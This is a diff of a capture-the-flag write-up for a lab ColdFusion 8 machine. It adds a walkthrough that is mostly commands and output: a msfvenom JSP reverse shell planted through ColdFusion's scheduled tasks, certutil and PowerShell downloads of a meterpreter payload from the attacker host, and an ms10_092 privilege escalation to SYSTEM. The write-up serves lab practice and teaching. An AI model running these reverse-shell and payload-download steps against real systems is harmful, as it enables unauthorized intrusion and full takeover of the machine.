@@ -19,6 +19,8 @@
 
 ### 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
 
+### 9. Privilege Escalation
+
 # Attack
 ## 1. NMAP
 Start.
@@ -590,24 +592,184 @@ Upon pressing the "Run Scheduled Task" button, it ran successfully with the mess
 
 To execute the payload we just placed, we need to go to the browser and navigate to `10.10.10.11:8500/CFIDE/meterpreter.exe`. However instead of running it, our browser attempts to download the `meterpreter.exe` payload instead. We need to find a file extension that Adobe ColdFusion is willing to run. Upon some research, we found that ColdFusion will execute [`.cfm`](https://reboare.gitbooks.io/security/content/webshell.html) & `.jsp` files.
 
-Since msfvenom allows for creation of `.jsp` webshell easily, we'll create a `.jsp` payload instead.
+Since msfvenom allows for creation of `.jsp` webshell easily, we'll create a `.jsp` instead of `.cfm` payload.
 ```
-hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: meterpreter.exe
+hippoeug@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=4545 -f raw -o jsp_shell.jsp
+Payload size: 1497 bytes
+Saved as: jsp_shell.jsp
 ```
 
 Let's Schedule New Task.
 ```
 Task Name: Reverse Shell
 Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
-URL: http://10.10.x.x/meterpreter.exe
+URL: http://10.10.x.x/jsp_shell.jsp
 Publish: Save output to a file
-File: C:\Users\tolis\meterpreter.exe
+File: C:\ColdFusion8\wwwroot\CFIDE\jsp_shell.jsp
 Submit
 ```
 This task was scheduled successfully.
+
+Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".
+
+To execute the payload we just placed, we need to go to the browser and navigate to `http://10.10.10.11:8500/CFIDE/jsp_shell.jsp`, and check our listener.
+```
+hippoeug@kali:~$ nc -lvnp 4545
+listening on [any] 4545 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.10.10.11] 50807
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\ColdFusion8\runtime\bin>
+...
+C:\Users\tolis\Desktop>type user.txt
+type user.txt
+02650d3a69a70780c302e146a6cb96f3
+
+C:\Users>whoami
+whoami
+arctic\tolis
+
+C:\Users>cd Administrator
+cd Administrator
+```
+Nope, no Administrator access.
+
+## 9. Privilege Escalation
+Let's first try to get a meterpreter shell!
+
+We'll write another msfvenom meterpreter payload with another port this time.
+```
+hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=6969 -f exe -o meterpreter_x.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: meterpreter_x.exe
+```
+
+Let's download this meterpreter payload onto the system like we have always done, with `certutil.exe`.
+```
+C:\Users\tolis>certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter_x.exe" meterpreter_x.exe
+certutil.exe -urlcache -split -f "http://10.10.x.x:80/meterpreter_x.exe" meterpreter_x.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+```
+Alternatively, we could also use Powershell to download the meterpreter payload.
+```
+C:\Users\tolis>powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.x.x:80/meterpreter_x.exe', 'ps.exe')
+powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.x.x:80/meterpreter_x.exe', 'ps.exe')
+```
+
+Before running the meterpreter payload with `C:\Users\tolis>meterpreter_x.exe`, we need to set up a listener.
+```
+msf5 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+...
+msf5 exploit(multi/handler) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf5 exploit(multi/handler) > set lport 6969
+lport => 6969
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:6969 
+[*] Sending stage (201283 bytes) to 10.10.10.11
+[*] Meterpreter session 1 opened (10.10.x.x:6969 -> 10.10.10.11:52300) at 2021-01-24 21:33:35 +0800
+ 
+meterpreter > getuid
+Server username: ARCTIC\tolis
+```
+Unforunately we are not in `nt authority\system`.
+
+We will try `getsystem` just for laughs.
+```
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+```
+Nope.
+
+Let's find some exploits!
+```
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.11 - Collecting local exploits for x64/windows...
+[*] 10.10.10.11 - 17 exploit checks are being tried...
+[+] 10.10.10.11 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 10.10.10.11 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.11 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.11 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+```
+Hmm, `ms10_092_schelevator` looks promising!
+
+We'll try that!
+```
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) > back
+msf5 > use exploit/windows/local/ms10_092_schelevator
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms10_092_schelevator) > show options
+...
+msf5 exploit(windows/local/ms10_092_schelevator) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:7070 
+[*] Preparing payload at C:\Users\tolis\AppData\Local\Temp\vGjynjeSj.exe
+[*] Creating task: BaOubZYx
+[*] SUCCESS: The scheduled task "BaOubZYx" has successfully been created.
+[*] SCHELEVATOR
+[*] Reading the task file contents from C:\Windows\system32\tasks\BaOubZYx...
+[*] Original CRC32: 0xf306d707
+[*] Final CRC32: 0xf306d707
+[*] Writing our modified content back...
+[*] Validating task: BaOubZYx
+[*] 
+[*] Folder: \
+[*] TaskName                                 Next Run Time          Status         
+[*] ======================================== ====================== ===============
+[*] BaOubZYx                                 1/2/2021 11:44:00 ��   Ready          
+[*] SCHELEVATOR
+[*] Disabling the task...
+[*] SUCCESS: The parameters of scheduled task "BaOubZYx" have been changed.
+[*] SCHELEVATOR
+[*] Enabling the task...
+[*] SUCCESS: The parameters of scheduled task "BaOubZYx" have been changed.
+[*] SCHELEVATOR
+[*] Executing the task...
+[*] Sending stage (176195 bytes) to 10.10.10.11
+[*] SUCCESS: Attempted to run the scheduled task "BaOubZYx".
+[*] SCHELEVATOR
+[*] Deleting the task...
+[*] Meterpreter session 3 opened (10.10.x.x:7070 -> 10.10.10.11:52366) at 2021-01-24 21:46:08 +0800
+[*] SUCCESS: The scheduled task "BaOubZYx" was successfully deleted.
+[*] SCHELEVATOR
+
+meterpreter > sessions
+Usage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+meterpreter > dir
+Listing: C:\users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-03-23 01:47:48 +0800  desktop.ini
+100444/r--r--r--  32    fil   2017-03-23 03:01:59 +0800  root.txt
+
+meterpreter > cat root.txt
+ce65ceee66b2b5ebaff07e50508ffb90
+```
+Tada! We got system flag!
